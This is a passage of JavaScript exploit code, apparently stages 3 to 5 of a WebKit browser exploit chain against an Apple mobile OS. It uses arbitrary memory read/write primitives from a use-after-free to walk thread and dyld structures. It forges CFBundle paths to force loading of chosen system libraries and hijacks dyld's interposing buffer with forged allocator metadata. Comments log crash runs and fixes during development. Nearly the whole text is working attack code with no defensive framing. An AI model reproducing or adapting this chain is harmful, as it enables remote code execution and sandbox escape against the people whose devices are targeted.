    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
}
// Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
// reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
// the rebuild self-check failed.



function tsdOffsetFor(pthreadPtr) {                      // self-anchor scan; cached
    if (p.tsdOff) return p.tsdOff;
    for (let off = 0x80n; off <= 0x120n; off += 8n) {
        if (p.read64(pthreadPtr + off) === pthreadPtr) { // tsd[0] == THREAD_SELF
            p.tsdOff = off;
            postMessage(`[token] tsd offset = +${hex(off)} (expect 0xe0)`);
            return off;
        }
    }
    return 0n;
}

function portFromWtfThread(thread) {
    for (let off = 0x20n; off <= 0xd0n; off += 8n) {
        const cand = p.read64(thread + off);
        if (!ptrOK(cand)) continue;                      // packed small-int field -> skip, no deref

        // port-shaped neighbor at +8 (m_platformThread) or +0xC (if uid/port swapped)
        const a = BigInt(p.read32(thread + off + 8n));
        const b = BigInt(p.read32(thread + off + 0xCn));
        const pa = a >= 0x100n && a < 0x10000000n && (a & 0xffn) !== 0n;
        const pb = b >= 0x100n && b < 0x10000000n && (b & 0xffn) !== 0n;
        if (!pa && !pb) continue;

        if (BigInt(p.read32(cand)) !== PTHREAD_SIG) continue;   // live ptr, wrong field

        const plat = pb ? b : a;
        const tsdOff = tsdOffsetFor(cand);
        const port1 = tsdOff ? BigInt(p.read32(cand + tsdOff + 0x18n)) : 0n;
        if (tsdOff && port1 !== plat) {
            postMessage(`[-] token mismatch m_platformThread=${hex(plat)} tsd[3]=${hex(port1)}`);
            continue;
        }

        p.knownPthread = cand;                           // anchor for mainThreadPort()
        postMessage(`[token] thread=${hex(thread)} pthread=${hex(cand)} m_handle=+${hex(off)} port=${hex(plat)}`);
        return plat;
    }
    postMessage(`[-] fingerprint failed; dumping Thread @ ${hex(thread)}`);
    dumpObject("thread", thread, 0x100n);
    return 0n;
}

function portFromContext(context) {
    const wot = p.read64(context + structs.WorkerGlobalScope_thread); // untagged weak-ptr word
    const back = p.read64(wot + OFF_WOT_GLOBALSCOPE);
    if (back < context || back >= context + 0x400n) {
        postMessage(`[-] back-ptr ${hex(back)} not in ctx ${hex(context)} — bad m_thread offset?`);
        return 0n;
    }
    return portFromWtfThread(p.read64(wot + OFF_WOT_WTFTHREAD));
}

const WTF_TSD_SLOT = 72n;   // WTF_THREAD_DATA_KEY = __PTK_FRAMEWORK_JAVASCRIPTCORE_KEY2

function tsdAnchor(pthreadPtr) {                     // per-struct self-anchor (23B85: +0xb0)
    for (let off = 0x80n; off <= 0x120n; off += 8n)
        if (p.read64(pthreadPtr + off) === pthreadPtr) return off;
    return 0n;
}

// worker token: two reads, shape-validated
function portFromWtfThread(thread) {
    const uid = BigInt(p.read32(thread + 0x30n));
    const port = BigInt(p.read32(thread + 0x34n));
    if (!(uid >= 1n && uid < 0x10000n && port >= 0x100n && port < 0x10000000n && (port & 0xffn) !== 0n)) {
        postMessage(`[-] bad uid/port ${hex(thread)} uid=${hex(uid)} port=${hex(port)}`);
        return 0n;
    }
    const pthread = p.read64(thread + 0x28n);
    if (ptrOK(pthread)) p.knownPthread = pthread;      // anchor for the main walk
    postMessage(`[token] thread=${hex(thread)} uid=${hex(uid)} port=${hex(port)} pthread=${hex(pthread)}`);
    return port;
}

// ============ pthread probe + main-thread token (23B85, empirical) ============
// 23B85 facts: pthread_t == struct base == stack region top.
//   struct+0x00 is NOT a magic sig (per-thread random u32) — never gate on it.
//   struct+0xb0 == stackaddr == pthread_t (self-referential) — NOT tsd[0].
//   WTF::Thread: m_handle +0x28 (== pthread_t), m_uid u32 +0x30, port u32 +0x34.

function dumpPthread(tag, pthread, wtfThread, expectPort) {
    if (!ptrOK(pthread)) { postMessage(`[dump ${tag}] bad pthread ${hex(pthread)}`); return; }
    postMessage(`[dump ${tag}] pthread=${hex(pthread)} wtfThread=${hex(wtfThread)} expectPort=${hex(expectPort)}`);
    let wtfOff = -1n;
    const selfs = [], lines = [];
    for (let off = 0x0n; off <= 0x400n; off += 8n) {
        const v = p.read64(pthread + off);
        if (v === 0n) continue;
        let m = '';
        if (v === pthread) { m += ' <SELF>'; selfs.push(off); }
        if (wtfThread && v === wtfThread) { m += ' <WTF-THREAD>'; wtfOff = off; }
        if (expectPort && (v & 0xffffffffn) === expectPort) m += ' <PORT32>';
        if (v > pthread && v < pthread + 0x900n) m += ' <INTO-STRUCT>';
        if (v >= pthread - 0x400000n && v < pthread - 0x1000n) m += ' <STACK>';
        lines.push(`+${off.toString(16)}=${hex(v)}${m}`);
    }
    while (lines.length) postMessage(`[dump ${tag}] ` + lines.splice(0, 6).join(' '));
    if (wtfOff < 0n) { postMessage(`[-] dump ${tag}: WTF-THREAD not under +0x400 — extend range`); return; }
    let chosen = 0n, chosenSlot = -1n;
    for (const s of selfs) {
        if (s >= wtfOff) continue;
        const d = wtfOff - s;
        if (d % 8n) continue;
        const slot = d / 8n;
        if (slot > 255n) continue;
        if (slot >= 64n && slot <= 79n) { chosen = s; chosenSlot = slot; break; }  // JSC key range
        if (chosenSlot < 0n) { chosen = s; chosenSlot = slot; }
    }
    if (chosenSlot >= 0n) {
        p.tsdBase = chosen; p.fastTlsSlot = chosenSlot;
        postMessage(`[+] tsdBase=+${chosen.toString(16)} fastTlsSlot=${chosenSlot} selfs=[${selfs.map(o => '+' + o.toString(16)).join(',')}]`);
    }
    // note: even if tsdBase lands on stackaddr instead of tsd[0], tsdBase+slot*8 is the
    // same address by construction — mainThreadPort() reads the right slot either way.
}

function mainThreadPort() {
    if (!p.knownPthread) { postMessage(`[-] mainThreadPort: no known pthread`); return 0n; }
    const tsdBase = p.tsdBase || 0xE0n;                                // dump-proven
    const slot = (p.fastTlsSlot !== undefined) ? p.fastTlsSlot : 92n;  // dump-proven (slot 92 @ +0x3C0)
    postMessage(`[main] tsdBase=+${tsdBase.toString(16)} slot=${slot}`);

    const list = [], seen = new Set();
    const push = (pt) => { const k = pt.toString(16); if (!seen.has(k)) { seen.add(k); list.push(pt); } };
    let cur = p.knownPthread;
    for (let n = 0; n < 64 && ptrOK(cur); n++) { push(cur); cur = p.read64(cur + 0x10n); }
    cur = p.read64(p.knownPthread + 0x18n);
    for (let n = 0; n < 64 && ptrOK(cur); n++) { const real = cur - 0x10n; push(real); cur = p.read64(real + 0x18n); }
    postMessage(`[main] ${list.length} pthreads on the list`);

    // NB: main's pthread struct is libpthread's STATIC struct (shared-cache __DATA) —
    // the +0xb0==pthread self-check does NOT hold for it. Validity = circular check only.
    let best = 0n, bestTid = 0n, bestPort = 0n, bestUid = 0n;
    for (const pt of list) {
        const selfB0 = p.read64(pt + 0xb0n);
        const bot = p.read64(pt + 0xb8n);
        const tid = p.read64(pt + 0xd8n);                           // kernel tid: main = minimum
        const tsd3 = BigInt(p.read32(pt + 0xF8n));                   // __TSD_MACH_THREAD_SELF (dump-proven)
        const wtfT = p.read64(pt + tsdBase + slot * 8n);
        let uid = 0n, port = 0n, rej = '';
        if (!ptrOK(wtfT)) rej += ' slot-null;';
        else if (p.read64(wtfT + 0x28n) !== pt) rej += ' no-circular;';
        else {
            uid = BigInt(p.read32(wtfT + 0x30n));
            port = BigInt(p.read32(wtfT + 0x34n));
            if (!(port >= 0x100n && port < 0x10000000n && (port & 0xffn) !== 0n)) rej += ' bad-port;';
            if (tsd3 !== port) rej += ` tsd3=${hex(tsd3)}!=port;`;
        }
        postMessage(`[main] pt=${hex(pt)} tid=${hex(tid)} stack=${hex(bot)}..${hex(selfB0)} self=${selfB0 === pt} uid=${hex(uid)} port=${hex(port)}${rej ? ' REJ' + rej : ''}`);
        if (rej || tid === 0n) continue;                               // tid==0: walk ran past the head
        if (!best || tid < bestTid) { best = wtfT; bestTid = tid; bestPort = port; bestUid = uid; }
    }
    if (!best) { postMessage(`[-] mainThreadPort: nothing validated`); return 0n; }
    postMessage(`[+] MAIN thread=${hex(best)} port=${hex(bestPort)} tid=${hex(bestTid)} uid=${hex(bestUid)} via min-tid`);
    if (bestUid !== 1n) postMessage(`[!] main uid != 1 — paste the table before stage 6`);
    p.mainWtfThread = best;
    return bestPort;
}


// one-time on-device validation of the slot number (run on the sub-worker)
function probeFastTLS(workerThread) {
    const pthread = p.read64(workerThread + 0x28n);
    const a = tsdAnchor(pthread);
    if (!a) return postMessage(`[ftls] no anchor ${hex(pthread)}`);
    postMessage(`[ftls] anchor=+${hex(a)} tid=${hex(p.read64(pthread + a - 8n))}`);
    for (let slot = 68n; slot <= 80n; ++slot) {
        const v = p.read64(pthread + a + slot * 8n);
        if (v === workerThread || (slot >= 70n && slot <= 74n))
            postMessage(`[ftls] slot ${slot}: ${hex(v)}${v === workerThread ? " <== WTF::Thread*" : ""}`);
    }
}


async function stage3() {
    const { offsets } = p;
    postMessage(`contexts_global = ${hex(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts)}`);
    const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
    postMessage(`contexts: ${hex(contexts)}`);
    const contexts_length = p.read64(contexts - 8n) >> 32n;
    postMessage(`contexts_length: ${hex(contexts_length)}`);
    const dlopen_workers = [];
    p.dlopen_workers = dlopen_workers;
    const seenCtx = new Set();   // the contexts map walk can revisit a slot -> dedupe by ctx
    for (let i = 0n; i < contexts_length; ++i) {
        const ptr = contexts + i * structs.ContextsMap_stride;
        const key = p.read64(ptr);
        if (!key) continue;
        const context = p.read64(ptr + structs.ContextsMap_value);
        const vtable = noPAC(p.read64(context));
        if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;

        const gs = workerGlobalScope(context);
        const id = workerMarker(context);
        const bitmap = workerBitmap(context);
        // ctx.m_thread (ThreadSafeWeakPtr) stores the WorkerOrWorkletThread* directly in its
        // m_objectOfCorrectType slot (a TaggedPtr -> mask the high tag bits), then +0x28 = WTF::Thread.
        const workerOrWorkletThread = noPAC(p.read64(context + structs.WorkerGlobalScope_thread));
        const thread = p.read64(workerOrWorkletThread + structs.WorkerThread_wtfThread);
        postMessage(`worker ctx=${hex(context)} gs=${hex(gs)} id=${hex(id)} bitmap=${hex(bitmap)} thread=${hex(thread)}`);
        dumpObject("thread", thread, 0x100n);
        // main's token (the one stage 6 actually needs for _lock):
        //   call the same function on main's WTF::Thread* from your context map:
        //       p.mainToken = portFromWtfThread(mainThread);
        //   — a Document has no m_thread, so portFromContext() does NOT apply there.
        //END GET TOKEN 
        const tag = id & 0xffffffffn;   // low 32 bits of the marker (int 0xffff0000.... or NaN-boxed 0xfffe0000....)
        const threadPort = portFromContext(context);
                if (gs === p.addrof(globalThis)) {
            p.myToken = threadPort;                      // the chain worker's own token
            postMessage(`[token] SELF=chain port=${hex(threadPort)}`);
        }

        if (tag === 0x11111111n || tag === 0x22222222n) {
            const ctxKey = context.toString();
            if (seenCtx.has(ctxKey)) continue;   // skip the duplicate slot (else classes[] overwrite each other)
            seenCtx.add(ctxKey);
            p.dlopen_workers.push({ ctx: context, thread, threadPort, id, bitmap });
        } else if (tag === 0x33333333n) {
            p.sub_worker = { ctx: context, thread, threadPort, id };
        }
    }
    // Order deterministically by marker so p.dlopen_workers[0]=0x11111111 (close()'d in stage4),
    // [1]=0x22222222 (stage6). stage4 then plants classes[0]=TTSMagic (the class that triggers
    // AVLoadSpeech) into the worker that actually gets close()'d. Walk order is NOT stable.
    p.dlopen_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)));
    p.mainToken = mainThreadPort();
    postMessage(`[stage3] dlopen_workers=${p.dlopen_workers.length} order=[${p.dlopen_workers.map(w => hex(w.id & 0xffffffffn)).join(",")}] sub_worker=${p.sub_worker ? "yes" : "no"}`);
}
async function stage4() {
    postMessage(`[stage4] dlopen prepared from worker`);
    //start from p.dlopen_workers
    const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
    postMessage(`defaultLoader: ${hex(defaultLoader)}`);
    if (defaultLoader) {
        const paciza_nullfunc = p.read64(offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
        postMessage(`paciza_nullfunc: ${hex(paciza_nullfunc)}`);
        const dispatchSource = p.read64(defaultLoader + structs.DefaultLoader_dispatchSource);
        postMessage(`dispatchSource: ${hex(dispatchSource)}`);
        const dispatchSomething = p.read64(dispatchSource + structs.DispatchSource_inner);
        postMessage(`dispatchSomething: ${hex(dispatchSomething)}`);
        const dispatchBlock = p.read64(dispatchSomething + structs.DispatchInner_block);
        postMessage(`dispatchBlock: ${hex(dispatchBlock)}`);
        p.write64(dispatchBlock + structs.DispatchBlock_invoke, paciza_nullfunc);
    }
    const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
    for (let i = 0; i < 2; ++i) {
        const worker = p.dlopen_workers[i];
        const wrappedBitmap = p.read64(worker.bitmap + structs.JSImageBitmap_wrapped);
        postMessage(`wrappedBitmap: ${hex(wrappedBitmap)}`);
        const imageBuffer = p.read64(wrappedBitmap + structs.ImageBitmap_buffer);
        postMessage(`imageBuffer: ${hex(imageBuffer)}`);
        p.write64(imageBuffer + structs.ImageBuffer_objcClass, classes[i]);
    }
    postMessage('Load TextToSpeech');
    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
    postMessage('TextToSpeech Loaded');
    const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
    postMessage(`NSBundleTables: ${hex(NSBundleTables)}`);
    const loadedFrameworks = p.read64(NSBundleTables + structs.NSBundleTables_loadedFrameworks);
    postMessage(`loadedFrameworks: ${hex(loadedFrameworks)}`);
    const loadedFrameworks_length = p.read64(loadedFrameworks + structs.LoadedFrameworks_count);
    postMessage(`loadedFrameworks_length: ${hex(loadedFrameworks_length)}`);
    const loadedFrameworks_buffer = p.read64(loadedFrameworks + structs.LoadedFrameworks_buffer);
    postMessage(`loadedFrameworks_buffer: ${hex(loadedFrameworks_buffer)}`);
    let TextToSpeech_NSBundle;
    for (let i = 0n; i < loadedFrameworks_length; ++i) {
        const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
        if (bundle <= 0x1_00000000n) continue;
        postMessage(`bundle[${i}]: ${hex(bundle)}`);
        const initialPath = p.read64(bundle + structs.NSBundle_initialPath);
        if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
        TextToSpeech_NSBundle = bundle;
        break;
    }
    postMessage(`TextToSpeech_NSBundle: ${hex(TextToSpeech_NSBundle)}`);
    const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + structs.NSBundle_cfBundle);
    postMessage(`TextToSpeech_CFBundle: ${hex(TextToSpeech_CFBundle)}`);
    p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
    p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;

    // Re-arm the TextToSpeech CFBundle's loader: mark it unloaded (NSBundle/CFBundle flags),
    // reset AVLoadSpeechSynthesisImplementation's dispatch_once, and repoint the bundle's
    // executable path at a forged CFString {cstringOffset, cstringSize}. The NEXT realization of
    // an AVFAudio class then dlopens that path instead of the real speech engine.
    // Write a NUL-terminated ASCII C string into a fresh, GC-pinned buffer and return its
    // backing-store pointer (m_vector @ addrof+0x10, the pattern proven in stage1's self-test).
    // Lets us hand CoreFoundation an attacker-controlled path with no dependency on a cache literal.
    p.cstrings = p.cstrings || [];
    p.makeCString = (str) => {
        const bytes = new Uint8Array(str.length + 1);            // + NUL
        for (let i = 0; i < str.length; i++) bytes[i] = str.charCodeAt(i);
        p.cstrings.push(bytes);                                  // pin for lifetime (GC already off)
        return { ptr: p.read64(p.addrof(bytes) + 0x10n), len: BigInt(str.length) };
    };

    p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
        p.write64(TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
        p.write8(TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
        p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cstringOffset);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cstringSize);
        p.write64(TextToSpeech_CFBundle + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
    }

    // worker1 park target = libARI (DarkSword's original). Confirmed present + parks on vphone 2026-07-11
    // (imports ___cxa_atexit; deps = CoreFoundation/libc++/libSystem, all already loaded -> no +load crash).
    const targetDylib = "/usr/lib/libARI.dylib";
    const dylibPath = p.makeCString(targetDylib);
    postMessage(`[stage4] dlopen target '${targetDylib}' buffer @ ${hex(dylibPath.ptr)} len=${dylibPath.len}`);
    p.rearmCFBundleLoader(dylibPath.ptr, dylibPath.len);
}


async function stage5() {
    postMessage(`[stage5] overwriting p_InterposeTupleAll_buffer`);
    const {
        offsets
    } = p;

    const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x11111111n);
    postMessage(`[stage5] worker.thread: ${hex(worker.thread)}`);
    const runtimeState = p.read64(offsets.libdyld__gAPIs);
    p.runtimeState = runtimeState;
    postMessage(`[stage5] runtimeState: ${hex(runtimeState)}`);
    const runtimeState_vtable = noPAC(p.read64(runtimeState));
    postMessage(`[stage5] runtimeState_vtable: ${hex(runtimeState_vtable)}`);
    const dyld_emptySlot = noPAC(p.read64(runtimeState_vtable));
    postMessage(`[stage5] dyld_emptySlot: ${hex(dyld_emptySlot)}`);
    const runtimeStateLock = p.read64(runtimeState + structs.RuntimeState_lock);
    postMessage(`[stage5] runtimeStateLock: ${hex(runtimeStateLock)}`);
    p.runtimeStateLock = runtimeStateLock;
    const p_InterposeTupleAll_buffer = runtimeState + structs.RuntimeState_interposeBuf;
    p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
    const p_InterposeTupleAll_size = runtimeState + structs.RuntimeState_interposeSize;
    p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
    postMessage(`[stage5] p_InterposeTupleAll_buffer: ${hex(p_InterposeTupleAll_buffer)}`);
    const stack_bottom = p.read64(worker.thread + structs.Thread_stackBottom);
    worker.stack_bottom = stack_bottom;
    postMessage(`[stage5] stack_bottom: ${hex(stack_bottom)}`);
    const stack_top = p.read64(worker.thread + structs.Thread_stackTop);
    worker.stack_top = stack_top;
    postMessage(`[stage5] stack_top: ${hex(stack_top)}`);
    p.create_jsstring = function (ptr, size) {
        const res = 'a'.repeat(8);
        const str = p.read64(p.addrof(res) + 8n);
        p.write64(str, size << 32n | structs.StringImpl_flags);
        p.write64(str + structs.StringImpl_data, ptr);
        return res;
    };
    p.efficient_search = function (begin, end, bytes) {
        const needle = String.fromCharCode(...bytes);
        const finder = p.create_jsstring(begin, end - begin);
        while (true) {
            const index = finder.indexOf(needle);
            if (index != -1) {
                postMessage(`[stage5] index:${index}`);
                return begin + BigInt(index);
            }
        }
    };
    const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
    postMessage(`[stage5] dyld_offset: ${hex(dyld_offset)}`);
    p.dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
    postMessage(`[stage5] p.dlopen_from_lambda_ret: ${hex(p.dlopen_from_lambda_ret)}`);
    u64[0] = p.dlopen_from_lambda_ret;
    const needle = [u8[0], u8[1], u8[2], u8[3]];
    postMessage(`[stage5] searching for dlopen_from_lambda_ret in worker thread's stack [${hex(stack_top)}-${hex(stack_bottom)}]...`);
    const search_result = p.efficient_search(stack_top, stack_bottom, needle);
    postMessage(`[stage5] search_result:${hex(search_result)}`);
    const loader = search_result + structs.StackFrame_loader;
    postMessage(`[stage5] loader:${hex(loader)}`);
    // 0x140 entries, not 0x100: run 014753 baseline showed PRE-EXISTING interposing state
    // (buffer=0x1ee8705e0 size=9). free()'s store lands size=oldSize+0x100=0x109, so dyld would
    // scan 9 tuples past a 0x100-entry array -> size the array to cover it (zero tuples are inert:
    // Loader::interpose never matches replacee==0).
    const interposingTuples = new BigUint64Array(0x140 * 2);
    p.interposingTuples = interposingTuples;
    const interposingTuples_data_ptr = interposingTuples.data();
    postMessage(`[stage5] interposingTuples_data_ptr:${hex(interposingTuples_data_ptr)}`);
    const prev_metadata = new BigUint64Array(4);
    const prev_metadata_data_ptr = prev_metadata.data();
    p.prev_metadata = prev_metadata;
    p.prev_metadata_data_ptr = prev_metadata_data_ptr;
    postMessage(`[stage5] prev_metadata_data_ptr:${hex(prev_metadata_data_ptr)}`);
    // AllocationMetadata layout REQUIRED by 26.1's free->deallocate->insert path (disasm:
    // free 0x180126a18, deallocate 0x180126b44, owner-walk 0x18011eda8, insert 0x180122938;
    // crashes 094420/094830/105411 ALL at insert+0x34 = 0x18012296c):
    //  - free's store: [RS+0xb8] = chunk - (metadata[1]&~3) + oldBuf + 0x10. With chunk =
    //    attackerBuf+K and metadata[1] = (oldBuf+K+0x10)|3 the store lands attackerBuf EXACTLY
    //    (K must stay 4-aligned so (metadata[1]&~3) == oldBuf+K+0x10).
    //  - deallocate needs metadata[1] BIT0 set (else fatal 0x1801a08e4), runs the owner-walk,
    //    then CLEARS the flag bits (and ~3 @ 0x180126b70) BEFORE tail-calling insert -- so |3's
    //    bit1 does NOT protect insert (the "no coalesce at all" theory was wrong).
    //  - owner-walk terminates on a link that is 0 or has bit0 set: prev_metadata self-link|1
    //    stops it AND keeps a valid owner (plain self-link livelocks; a 0 link -> null owner ->
    //    the 15:19-15:23 freeze / 094504). prev_metadata[1]=1 terminates insert's ldrb.
    //  - insert+0x34 (the killer): x9 = metadata[1]&~3 = oldBuf+K+0x10; x9 = [x9+8] =
    //    [oldBuf+K+0x18]; if that qword has BIT0 SET the merge-write is skipped; bit0 clear ->
    //    str x0,[x9] -> null/wild write (far=0x0 in 094420/094830, far=0x3130414100000000 in
    //    105411). 131246 survived because [oldBuf+0x218] happened to be ODD -- that was the luck.
    //    Fix: SCAN oldBuf (readable; TPRO blocks writes, not reads) for a K with [oldBuf+K+0x18]
    //    odd. No writes to oldBuf anywhere.
    prev_metadata[0] = prev_metadata_data_ptr | 1n;
    prev_metadata[1] = 1n;
    const oldBuf = p.read64(p_InterposeTupleAll_buffer);
    const pageLeft = 0x4000n - (oldBuf & 0x3fffn) - 0x20n;
    const kMax = pageLeft < 0x2700n ? pageLeft : 0x2700n;
    let K = 0n;
    for (let k = 0x100n; k < kMax; k += 8n) {
        if ((p.read64(oldBuf + k + 0x18n) & 1n) === 1n) { K = k; break; }
    }
    if (K === 0n) { K = 0x200n; postMessage(`[stage5] WARN: no odd qword near oldBuf; fallback K=0x200 (131246 luck)`); }
    const metadata_addr = interposingTuples_data_ptr + K;
    postMessage(`[stage5] oldBuf=${hex(oldBuf)} K=${hex(K)} metadata_addr=${hex(metadata_addr)} flagQword=${hex(p.read64(oldBuf + K + 0x18n))}`);
    p.write64(metadata_addr + 0n, p.prev_metadata_data_ptr);          // chunk link -> prev_metadata (valid owner)
    p.write64(metadata_addr + 8n, (oldBuf + K + 0x10n) | 3n);         // size field (bit0 = deallocate's gate)
    const metadata_data_ptr = metadata_addr;                            // alias for the vecSlot writes below
    p.metadata1 = metadata_addr;
    // The forged vector must sit at lambda0's x19+0x70, NOT needle+0x78 (= x19+0x900): the
    // epilogue's two resize(0) calls (0x180153bd0 / 0x180153bec, guarded on begin!=0) consume
    // x19+0x70 / x19+0x90 ONLY. needle = saved lr at x19+0x888, so x19+0x70 = needle-0x818.
    // (Proven by run 123404: worker1 woke+unlocked but no store -- the slot was never consumed.)
    const vecSlot = search_result - 0x818n;
    postMessage(`[stage5] vecSlot(x19+0x70)=${hex(vecSlot)}`);
    p.write64(vecSlot, p_InterposeTupleAll_buffer - 0x10n);        // lsl::Vector.allocator = dest-0x10
    p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n);            // .begin = forged AllocationMetadata
    p.write64(vecSlot + 0x10n, 0n);                                // .size = 0 (copy step is a no-op)
    p.write64(loader, p_InterposeTupleAll_buffer - 0x10n);
    p.write64(loader + 8n, metadata_data_ptr + 0x10n);

    // --- drive the HOMEUI load on the MAIN worker to wake worker1 ---
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    const homeUIPath = p.makeCString("/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI");
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, homeUIPath.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, homeUIPath.len);
    postMessage("Atexit mutex state: " + p.read64(hex(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState)));
// --- seedforge arm: poll learns chainTok, seeds count, forges worker1's token ---


    postMessage(`[stage5] going to load AVSpeechSynthesisVoice`);
  // --- silent load: worker1 sleeps through the whole load — no wake, no stale unlock ---
p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);  // pass-through, no broadcast
p.silentLoad = true;

        // arm the bundle-lock handoff on worker2 BEFORE the wake-load — close() blocks this thread
    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
    postMessage(`[stage5] succeeded to load`);
  p.silentLoad = false;

    // === wake worker1 (UNFUSED): the load stays silent; the wake comes from a broadcast that
    // does NOT hold TT._lock. dyld performs the REAL interpose write inside worker1's own
    // dlopen_from epilogue off the hijacked loader -- the chain never writes +0xb8/+0xc0.
    //   1) seed TT._lock with worker1's own token -> its pending stale unlock is legal WHENEVER it fires
    //   2) arm the 0x100 waiter bit -> the next __cxa_atexit release anywhere in the process broadcasts
    //   3) wait until dyld wrote the buffer AND worker1 cleared the lock (unlock proves it fully returned)
    const w1tok = BigInt(worker.threadPort);
    const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
    p.write32le(lockAddr, w1tok);
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
    pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
    postMessage({ type: 'pump_start' });   // page-side window-only battery
    initWakeTargets();
    // baseline BEFORE any wake: run-260719_013148 showed buffer non-zero from the first sample
    // (0x200ca05e0, dyld persistent region) -- pre-existing interposing state; the metadata delta
    // compensates (see above) so the store must land EXACTLY interposingTuples_data_ptr.
    postMessage(`[stage5] baseline: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} lock=${hex(p.read64(lockAddr) & 0xffffffffn)} atexit=${hex(p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState))} want buffer=${hex(interposingTuples_data_ptr)}`);
    let __buf = 0n, __w = w1tok, __spins = 0, __allSpentLogged = false;
    while (true) {
        __buf = p.read64(p.p_InterposeTupleAll_buffer);
        __w = p.read64(lockAddr) & 0xffffffffn;
        if (__buf === interposingTuples_data_ptr && __w !== w1tok) break;  // dyld wrote OUR buffer AND worker1 fully unlocked
        if (++__spins % 250000 === 0) {
            p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing (see read64 re-linker note) -- stale 0x9 reads / write64 recursion crash otherwise
            // re-arm ONLY from 0: a blind 0x100 store can clobber a live 0x103 acquisition (another
            // thread mid-__cxa_atexit, which the pump is deliberately provoking) -> atexit list
            // corruption -> crash. The waiter bit is sticky (releases preserve it), so 0x100 needs no refresh.
            const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
            if (__as === 0n) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
            // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
            // Fallback every 3M spins: the plant-target sequencer.
            if (__spins === 250000) {
                await fireNextWakePath(w1tok);
            } else if (__spins % 3000000 === 0) {
                const t = nextWakeTarget();
                if (t) await fireWakeTarget(t, lockAddr, w1tok);
                else {
                    if (!__allSpentLogged) { __allSpentLogged = true; postMessage(`[stage5] ALL wake targets spent -- pump-only from here (lldb if this persists)`); }
                    if (__spins % 3000000 === 0) pumpSoftlink();
                }
            }
            if (__spins % 1000000 === 0) postMessage(`[stage5] wake-worker1 ${__spins}: buffer=${hex(__buf)} lock=${hex(__w)} atexit=${hex(__as)} (want buffer=${hex(interposingTuples_data_ptr)} lock!=${hex(w1tok)})`);
            if (__spins >= 20000000) {
                postMessage(`[stage5] WAKE TIMEOUT -- no broadcast reached worker1 (seed left in place; crash-safe, worker2 NOT triggered)`);
                postMessage({ type: 'pump_stop' });
                return false;
            }
        }
    }
    postMessage({ type: 'pump_stop' });
    postMessage(`[stage5] worker1 interposed for real: buffer=${hex(__buf)} lock=${hex(__w)}`);

    // --- re-arm to PARK worker2, redirect the bundle to PerfPower ---
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
    p.write8(p.TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
